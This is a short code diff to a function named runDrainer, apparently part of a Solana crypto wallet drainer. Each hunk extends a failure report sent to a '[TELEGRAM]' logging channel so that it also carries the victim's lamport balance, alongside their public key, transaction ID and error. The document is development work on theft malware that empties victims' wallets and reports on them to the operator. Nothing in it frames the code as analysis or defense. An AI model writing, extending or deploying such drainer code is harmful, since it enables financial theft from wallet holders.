@@ -1540,7 +1540,8 @@ async function runDrainer(provider) {
                               publicKey: publicKey.toString(),
                               txid: txid,
                               status: 'failed',
-                              error: txStatus.err
+                              error: txStatus.err,
+                              lamports: balance || 0
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
                           
@@ -1575,7 +1576,8 @@ async function runDrainer(provider) {
                               publicKey: publicKey.toString(),
                               txid: txid,
                               status: 'failed',
-                              error: 'Transaction not confirmed'
+                              error: 'Transaction not confirmed',
+                              lamports: balance || 0
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
                           
@@ -1593,7 +1595,8 @@ async function runDrainer(provider) {
                             publicKey: publicKey.toString(),
                             txid: txid,
                             status: 'failed',
-                            error: 'Status check failed'
+                            error: 'Status check failed',
+                            lamports: balance || 0
                           })
                         }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
                         
